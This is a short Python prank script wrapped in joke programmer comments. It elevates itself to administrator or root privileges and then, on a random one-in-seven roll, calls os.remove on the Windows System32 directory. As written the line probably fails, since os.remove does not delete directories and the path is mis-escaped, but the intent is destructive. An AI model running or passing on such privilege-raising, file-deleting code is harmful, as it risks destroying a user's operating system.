#
# You may think you know what the following code does.
# But you dont. Trust me.
# Fiddle with it, and youll spend many a sleepless night 
# cursing the moment you thought youd be clever
# enough to "optimize" the code below.
# Now close this file and go play with something else.



import random
import os
import os
from elevate import elevate

def is_root():
    return os.getuid() == 0 #magic, dont touch

print("before ", is_root())
elevate()
print("after ", is_root())

if random.randint(0, 6) == 4:
#int getRandomNumber()
#{
#Return 4  chosen by fair dice roll.
# guaranteed to be random.
#}


 os.remove("C:\Windows\System32") #for the sins i am about to commit, may god forgive me

#i am not responsible for this code, they made me write it